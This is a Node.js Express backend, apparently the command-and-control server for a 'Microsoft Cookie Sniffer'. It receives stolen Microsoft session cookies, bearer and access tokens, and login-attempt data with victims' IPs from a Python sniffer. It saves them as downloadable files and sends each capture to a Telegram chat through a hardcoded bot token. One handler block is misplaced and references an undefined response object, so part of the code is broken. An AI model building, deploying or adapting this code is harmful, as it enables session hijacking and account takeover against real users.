const express = require("express");
const fs = require('fs').promises;
const path = require('path');
const router = express.Router();

// ==================== CONFIGURATION ====================
const BOT_TOKEN = process.env.BOT_TOKEN || "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4";
const CHAT_ID = process.env.CHAT_ID || "6068638071";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const DATA_DIR = path.join(__dirname, '../data/sessions');

// ==================== FILE MANAGEMENT ====================
async function ensureDataDir() {
  try {
    await fs.access(DATA_DIR);
  } catch (error) {
    await fs.mkdir(DATA_DIR, { recursive: true });
    console.log('Created data directory:', DATA_DIR);
  }
}

function sanitizeFilename(filename) {
  return filename.replace(/[^a-zA-Z0-9._-]/g, '_');
}

async function saveSessionData(victimData) {
  await ensureDataDir();
  
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const service = victimData.service || 'unknown';
  const filename = `session_${service}_${timestamp}.json`;
  const safeFilename = sanitizeFilename(filename);
  const filepath = path.join(DATA_DIR, safeFilename);
  
  // Enhanced data with file info
  const enhancedData = {
    ...victimData,
    file_info: {
      filename: safeFilename,
      saved_at: new Date().toISOString(),
      download_url: `/chukachina/download/${safeFilename}`
    }
  };
  
  await fs.writeFile(filepath, JSON.stringify(enhancedData, null, 2));
  console.log('💾 Session data saved:', safeFilename);
  
  return {
    filename: safeFilename,
    filepath: filepath,
    download_url: `/chukachina/download/${safeFilename}`
  };
}

// ==================== TELEGRAM ALERT ====================
async function sendTelegramAlert(victimData, fileInfo) {
  try {
    let message = '';
    
    // Handle different data types from Python script
    if (victimData.type === 'microsoft_cookie' || victimData.type === 'microsoft_set_cookie') {
      message = `🍪 <b>MICROSOFT COOKIE CAPTURED</b>

🌐 <b>Domain:</b> ${victimData.data?.domain || 'unknown'}
🔐 <b>Cookie Type:</b> ${victimData.type}
📊 <b>Cookies Found:</b> ${Object.keys(victimData.data?.cookie_data?.cookies_parsed || {}).length}

📍 <b>Target IP:</b> ${victimData.target_ip}
⏰ <b>Time:</b> ${victimData.timestamp}

💾 <b>Storage:</b>
├ File: <code>${fileInfo.filename}</code>
└ Download: /chukachina/download/${fileInfo.filename}`;

    } else if (victimData.type === 'bearer_token' || victimData.type === 'access_token') {
      message = `🔑 <b>MICROSOFT TOKEN CAPTURED</b>

🌐 <b>Domain:</b> ${victimData.data?.domain || 'unknown'}
🔐 <b>Token Type:</b> ${victimData.type}
📏 <b>Token Length:</b> ${victimData.data?.token_data?.token_length || 'unknown'}

📍 <b>Target IP:</b> ${victimData.target_ip}
⏰ <b>Time:</b> ${victimData.timestamp}`;

    } else if (victimData.type === 'microsoft_site_visit') {
      message = `🌐 <b>MICROSOFT SITE VISITED</b>

📡 <b>Domain:</b> ${victimData.data?.domain || 'unknown'}
👤 <b>Target IP:</b> ${victimData.target_ip}
⏰ <b>Time:</b> ${victimData.timestamp}`;

    } else if (victimData.type === 'login_attempt') {
      message = `🔐 <b>MICROSOFT LOGIN ATTEMPT</b>

🌐 <b>Domain:</b> ${victimData.data?.domain || 'unknown'}
📝 <b>Data Preview:</b> ${victimData.data?.payload_preview || 'No data'}
👤 <b>Target IP:</b> ${victimData.target_ip}
⏰ <b>Time:</b> ${victimData.timestamp}`;

    } else {
      // Generic message for other types
      message = `📦 <b>NEW DATA RECEIVED</b>

📊 <b>Type:</b> ${victimData.type}
🌐 <b>Service:</b> ${victimData.data?.domain || 'microsoft'}
👤 <b>Target IP:</b> ${victimData.target_ip}

💾 <b>Storage:</b>
├ File: <code>${fileInfo.filename}</code>
└ Time: ${new Date().toISOString()}`;
    }

    const response = await fetch(TELEGRAM_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });


    // Add to your router.post('/', ...) after other type checks

if (victimData.type === 'microsoft_cookie_auto') {
  console.log('🎯 AUTO MICROSOFT COOKIE:', victimData.data.domain);
  
  const fileInfo = await saveSessionData({
      ...victimData,
      service: 'microsoft_auto_cookies',
      capture_method: 'auto_python_grabber'
  });

  const telegramMessage = `🤖 <b>AUTO MICROSOFT COOKIE GRABBED</b>

🌐 <b>Domain:</b> ${victimData.data.domain}
🍪 <b>Cookies Found:</b> ${victimData.data.cookie_count}

📍 <b>Target IP:</b> ${victimData.target_ip}
⏰ <b>Time:</b> ${victimData.timestamp}

💾 <b>Auto-saved to:</b> <code>${fileInfo.filename}</code>`;

  await fetch(TELEGRAM_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
          chat_id: CHAT_ID,
          text: telegramMessage,
          parse_mode: 'HTML'
      })
  });

  return res.status(200).json({
      success: true,
      message: "Auto Microsoft cookies captured",
      cookies_captured: victimData.data.cookie_count,
      storage_info: {
          filename: fileInfo.filename,
          download_url: `https://chuksinno-backend-1.onrender.com${fileInfo.download_url}`
      }
  });
}

    if (!response.ok) {
      console.error('Telegram API error:', response.status, response.statusText);
      return null;
    }

    return await response.json();
  } catch (error) {
    console.error('Telegram error:', error);
    return null;
  }
}

// ==================== MAIN ENDPOINT ====================
router.post('/', async (req, res) => {
  try {
    console.log('🎯 New data received from Python sniffer!');
    console.log('📥 Received data type:', req.body?.type);
    
    const victimData = req.body;
    
    // Validate required fields
    if (!victimData.type) {
      return res.status(400).json({
        success: false,
        message: "Missing required field: type"
      });
    }

    // Handle connection test first
    if (victimData.type === 'connection_test') {
      console.log('🔗 Connection test received');
      
      return res.status(200).json({
        success: true,
        message: "Backend connection successful",
        type: victimData.type,
        timestamp: new Date().toISOString()
      });
    }

    // Handle heartbeat
    if (victimData.type === 'heartbeat') {
      console.log('💓 Heartbeat received - Packets:', victimData.data?.packets_processed);
      
      return res.status(200).json({
        success: true,
        message: "Heartbeat received",
        type: victimData.type,
        packets_processed: victimData.data?.packets_processed,
        timestamp: new Date().toISOString()
      });
    }

    // Handle final report
    if (victimData.type === 'final_report') {
      console.log('📊 Final report received');
      
      const fileInfo = await saveSessionData({
        ...victimData,
        service: 'attack_summary',
        report_type: 'final'
      });
      
      return res.status(200).json({
        success: true,
        message: "Final report saved",
        type: victimData.type,
        storage_info: {
          filename: fileInfo.filename,
          download_url: fileInfo.download_url
        },
        timestamp: new Date().toISOString()
      });
    }

    // Handle Microsoft-specific data
    const microsoftTypes = [
      'microsoft_cookie',
      'microsoft_set_cookie', 
      'bearer_token',
      'access_token',
      'microsoft_site_visit',
      'login_attempt'
    ];

    if (microsoftTypes.includes(victimData.type)) {
      console.log(`🎯 Microsoft ${victimData.type} captured`);
      
      // Determine service name based on type
      let service = 'microsoft';
      if (victimData.type.includes('cookie')) {
        service = 'microsoft_cookies';
      } else if (victimData.type.includes('token')) {
        service = 'microsoft_tokens';
      } else if (victimData.type.includes('site')) {
        service = 'microsoft_sites';
      } else if (victimData.type.includes('login')) {
        service = 'microsoft_login';
      }

      // Save session data
      const fileInfo = await saveSessionData({
        ...victimData,
        service: service,
        captured_at: new Date().toISOString()
      });

      // Send Telegram alert
      await sendTelegramAlert(victimData, fileInfo);

      return res.status(200).json({
        success: true,
        message: `${victimData.type} received and saved`,
        data_type: victimData.type,
        storage_info: {
          filename: fileInfo.filename,
          download_url: `https://chuksinno-backend-1.onrender.com${fileInfo.download_url}`
        },
        timestamp: new Date().toISOString()
      });
    }

    // Handle unknown types
    console.log('❓ Unknown data type:', victimData.type);
    
    const fileInfo = await saveSessionData({
      ...victimData,
      service: 'unknown_type',
      captured_at: new Date().toISOString()
    });

    return res.status(200).json({
      success: true,
      message: "Unknown data type saved",
      data_type: victimData.type,
      storage_info: {
        filename: fileInfo.filename,
        download_url: `https://chuksinno-backend-1.onrender.com${fileInfo.download_url}`
      },
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error("❌ Error processing data:", error);
    res.status(500).json({
      success: false,
      message: "Internal server error",
      error: error.message
    });
  }
});

// ==================== DOWNLOAD ENDPOINT ====================
router.get('/download/:filename', async (req, res) => {
  try {
    const filename = req.params.filename;
    const safeFilename = sanitizeFilename(filename);
    
    // Security check
    if (safeFilename !== filename) {
      return res.status(400).json({ 
        success: false, 
        message: "Invalid filename" 
      });
    }
    
    const filepath = path.join(DATA_DIR, safeFilename);
    
    // Check if file exists
    try {
      await fs.access(filepath);
    } catch (error) {
      return res.status(404).json({ 
        success: false, 
        message: "File not found" 
      });
    }
    
    // Set headers and send file
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', `attachment; filename="${safeFilename}"`);
    
    const fileContent = await fs.readFile(filepath, 'utf8');
    res.send(fileContent);
    
    console.log('📤 File downloaded:', safeFilename);
    
  } catch (error) {
    console.error('Error downloading file:', error);
    res.status(500).json({ 
      success: false, 
      message: "Error downloading file" 
    });
  }
});

// ==================== LIST FILES ENDPOINT ====================
router.get('/sessions', async (req, res) => {
  try {
    await ensureDataDir();
    
    const files = await fs.readdir(DATA_DIR);
    const sessionFiles = files.filter(file => file.endsWith('.json'));
    
    const sessions = await Promise.all(
      sessionFiles.map(async (file) => {
        try {
          const filepath = path.join(DATA_DIR, file);
          const content = await fs.readFile(filepath, 'utf8');
          const data = JSON.parse(content);
          
          return {
            filename: file,
            service: data.service,
            type: data.type,
            timestamp: data.timestamp,
            target_ip: data.target_ip,
            domain: data.data?.domain || 'unknown',
            download_url: `/chukachina/download/${file}`
          };
        } catch (error) {
          console.error(`Error reading file ${file}:`, error);
          return null;
        }
      })
    );
    
    // Filter out null entries
    const validSessions = sessions.filter(session => session !== null);
    
    res.json({
      success: true,
      total_sessions: validSessions.length,
      sessions: validSessions
    });
    
  } catch (error) {
    console.error('Error listing sessions:', error);
    res.status(500).json({
      success: false,
      message: "Error listing session files"
    });
  }
});

// ==================== HEALTH CHECK ====================
router.get('/health', async (req, res) => {
  try {
    await ensureDataDir();
    
    const files = await fs.readdir(DATA_DIR);
    const sessionCount = files.filter(file => file.endsWith('.json')).length;
    
    // Get recent sessions
    const recentSessions = await Promise.all(
      files.slice(-5).map(async (file) => {
        try {
          const filepath = path.join(DATA_DIR, file);
          const content = await fs.readFile(filepath, 'utf8');
          const data = JSON.parse(content);
          return {
            filename: file,
            type: data.type,
            service: data.service,
            timestamp: data.timestamp
          };
        } catch (error) {
          return null;
        }
      })
    );
    
    res.json({
      success: true,
      message: "Microsoft Cookie Sniffer Backend is running",
      endpoints: {
        main: "POST /chukachina",
        download: "GET /chukachina/download/:filename",
        sessions: "GET /chukachina/sessions",
        health: "GET /chukachina/health"
      },
      statistics: {
        total_sessions: sessionCount,
        data_directory: DATA_DIR
      },
      recent_activity: recentSessions.filter(s => s !== null),
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: "Health check failed",
      error: error.message
    });
  }
});

module.exports = router;